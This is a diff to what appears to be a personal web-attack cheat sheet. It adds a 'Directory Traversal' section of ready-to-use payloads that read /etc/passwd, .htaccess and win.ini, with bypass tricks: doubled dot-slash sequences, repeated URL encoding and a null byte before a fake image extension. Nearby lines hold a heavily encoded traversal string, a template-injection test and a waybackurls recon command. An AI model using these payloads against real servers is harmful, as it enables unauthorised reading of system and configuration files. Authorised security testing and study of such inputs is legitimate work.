@@ -451,6 +451,18 @@ if output is 49 then vulnerable and vice versa
   
   Path traversal to LFI 
 
+Directory Traversal 
+
+../../../../../../../../../etc/passwd => can url encode the ../../
+../../../../etc/passwd
+../../.htaccess
+\..\WINDOWS\win.ini
+\..\..\WINDOWS\win.ini
+....//....//....//etc/passwd
+can encode url one time or two times or three times
+../../../etc/passwd%00.png
+
+
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
 
 echo http://example.gov | waybackurls | grep /images/
